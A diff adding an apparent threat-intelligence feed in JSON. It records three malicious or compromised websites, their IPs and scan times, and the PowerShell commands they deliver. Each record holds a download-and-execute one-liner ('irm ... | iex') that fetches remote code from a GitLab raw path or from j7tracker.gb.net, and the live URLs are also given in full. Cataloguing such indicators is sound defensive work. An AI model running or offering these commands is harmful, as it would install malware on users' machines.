@@ -1,1 +1,61 @@
-[]
+[
+  {
+    "UrlDomain": "canconnectmedia.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "132.148.178.228"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
+    ],
+    "ReportId": "cmwoauwbm1yu70oml45lo3jkx",
+    "ScannedAt": "2026-11-20T01:27:50.628000+00:00"
+  },
+  {
+    "UrlDomain": "mitsubishikimlienhanoi.vn",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "36.50.26.24"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
+    ],
+    "ReportId": "cmwoarw6c1ytk0omlfgbkqvw7",
+    "ScannedAt": "2026-11-20T01:25:30.403000+00:00"
+  },
+  {
+    "UrlDomain": "zekoturizm.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/f6e1bc839f837436"
+    ],
+    "IP": [
+      "37.18.61.132"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/f6e1bc839f837436')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/f6e1bc839f837436"
+    ],
+    "ReportId": "cmwo9kdgz1ys80omlr22sxrni",
+    "ScannedAt": "2026-11-20T00:51:39.997000+00:00"
+  }
+]
